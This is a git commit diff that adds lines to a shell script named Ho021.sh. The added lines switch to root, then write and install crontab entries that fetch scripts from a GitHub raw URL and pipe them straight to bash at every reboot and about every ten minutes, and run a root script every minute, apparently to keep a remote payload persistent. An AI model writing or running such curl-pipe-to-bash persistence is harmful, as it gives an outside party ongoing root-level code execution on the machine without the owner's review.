a4a488ee5fab243a88feaa213c20158c583a7458
junscapital <52300722+junscapital@users.noreply.github.com>
2020-08-03 21:57:39 +0800

    Update Ho021.sh

--- Ho021.sh
+++ Ho021.sh
@@ -1,1 +1,8 @@
 #!/bin/sh
+sudo su
+echo "@reboot curl https://raw.githubusercontent.com/junscapital/reload/master/inreload.sh | bash
+1,11,21,31,41,51 * * * * curl https://raw.githubusercontent.com/junscapital/reload/master/Ho021.sh | bash
+*/1 * * * * sudo bash /root/blockip.sh
+ " >> myverifier
+sudo crontab myverifier
+rm myverifier
